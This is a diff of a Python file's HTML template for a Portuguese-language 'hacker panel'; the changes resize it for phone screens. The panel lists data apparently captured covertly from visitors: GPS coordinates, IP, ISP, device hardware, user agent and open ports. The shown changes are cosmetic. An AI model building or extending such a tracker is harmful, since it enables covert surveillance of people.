@@ -111,7 +111,7 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Hacker com listas 100% transparentes e o OLHO DE DEUS em destaque absoluto ao fundo
+# Painel Hacker com Arte ASCII Responsiva (ajustada para telas de celulares como iPhone 11)
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -130,23 +130,30 @@ HTML_PAINEL = """
             position: relative;
             min-height: 100vh;
         }
-        /* ARTE ASCII FIXA E EM DESTAQUE AO FUNDO */
+        /* ARTE ASCII RESPONSIVA - ENCAIXA PERFEITAMENTE EM QUALQUER TELA DE CELULAR */
         .watermark-ascii {
             position: fixed;
-            top: 40vh;
+            top: 42vh;
             left: 50%;
             transform: translateX(-50%);
             font-family: monospace;
-            font-size: 13px;
-            line-height: 1.2;
+            font-size: 2.2vw; /* Ajusta o tamanho proporcionalmente à largura da tela */
+            line-height: 1.15;
             color: rgba(0, 255, 102, 0.75);
             text-shadow: 0 0 15px rgba(0, 255, 102, 0.9);
             white-space: pre;
             z-index: 0;
             pointer-events: none;
             text-align: center;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             font-weight: bold;
+        }
+        /* Em computadores maiores, limita para não ficar gigante */
+        @media (min-width: 900px) {
+            .watermark-ascii {
+                font-size: 13px;
+                letter-spacing: 1px;
+            }
         }
         .content-wrapper {
             position: relative;
@@ -154,7 +161,7 @@ HTML_PAINEL = """
         }
         h2 {
             color: #00FF66;
-            font-size: 15px;
+            font-size: 14px;
             border-bottom: 1px dashed rgba(0, 255, 102, 0.5);
             padding-bottom: 4px;
             margin-top: 25px;
@@ -165,7 +172,7 @@ HTML_PAINEL = """
             border: 1px solid rgba(0, 255, 102, 0.3);
             padding: 10px;
             border-radius: 4px;
-            font-size: 13px;
+            font-size: 12px;
             margin-bottom: 15px;
         }
         .table-container {
@@ -178,17 +185,17 @@ HTML_PAINEL = """
             width: 100%;
             border-collapse: collapse;
             background: rgba(2, 4, 2, 0.25);
-            font-size: 13px;
+            font-size: 12px;
         }
         th, td {
             border: 1px solid rgba(26, 51, 26, 0.3);
-            padding: 10px 8px;
+            padding: 8px 6px;
             text-align: left;
         }
         th {
             background: rgba(5, 15, 5, 0.4);
             color: #00FF66;
-            font-size: 13px;
+            font-size: 12px;
             letter-spacing: 1px;
         }
         tr:nth-child(even) { background: rgba(2, 4, 2, 0.2); }
@@ -211,7 +218,7 @@ HTML_PAINEL = """
             font-weight: bold;
             padding: 2px 6px;
             border-radius: 3px;
-            font-size: 12px;
+            font-size: 11px;
             text-align: center;
         }
         details summary {
@@ -223,10 +230,10 @@ HTML_PAINEL = """
             color: #FF5555;
             text-align: center;
             padding: 15px;
-            font-size: 13px;
+            font-size: 12px;
         }
         .terminal-text {
-            font-size: 12px;
+            font-size: 11px;
             color: #88ff88;
             line-height: 1.4;
             background: rgba(3, 5, 3, 0.3);
@@ -265,9 +272,9 @@ HTML_PAINEL = """
             <tr>
                 <th>ID</th>
                 <th>DATA / HORA</th>
-                <th>IP DE ORIGEM</th>
+                <th>IP ORIGEM</th>
                 <th>LAT / LONG</th>
-                <th>PRECISÃO</th>
+                <th>PREC</th>
                 <th>MAPS</th>
             </tr>
             {% for r in gps %}
@@ -294,7 +301,7 @@ HTML_PAINEL = """
                 <th>IP / LOCALIZAÇÃO / ISP</th>
                 <th>HARDWARE & DISPOSITIVO</th>
                 <th>NAVEGADOR / USER-AGENT</th>
-                <th>PORTAS ABERTAS</th>
+                <th>PORTAS</th>
             </tr>
             {% for r in ips %}
             <tr>
@@ -307,7 +314,7 @@ HTML_PAINEL = """
                     Conexão: <b>{{ r.hw.connectionType }}</b>
                 </td>
                 <td>
-                    Cores CPU: {{ r.hw.hardwareConcurrency }}<br>
+                    CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                     RAM: {{ r.hw.deviceMemory }} GB<br>
                     Bateria: {{ r.hw.bateria }}<br>
                     Tela: {{ r.hw.resolucqao }}<br>
